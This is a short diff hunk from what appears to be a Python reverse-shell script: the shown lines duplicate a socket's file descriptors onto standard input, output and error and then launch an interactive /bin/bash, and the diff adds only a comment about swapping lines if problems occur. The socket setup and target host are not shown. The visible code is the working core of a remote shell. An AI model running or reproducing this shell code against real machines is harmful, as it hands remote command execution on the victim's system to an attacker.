@@ -47,6 +47,7 @@ if __name__ == "__main__":
     dup2(socket_sock.fileno(),1) # used for request I/O actions from the OS
     dup2(socket_sock.fileno(),2)
     
+    # if you have any issues try: comment line 41 out and uncommend line 42
     run(["/bin/bash", "-i"]) # finally run the bash console
     # run(["/bin/bash"], shell=True)
 
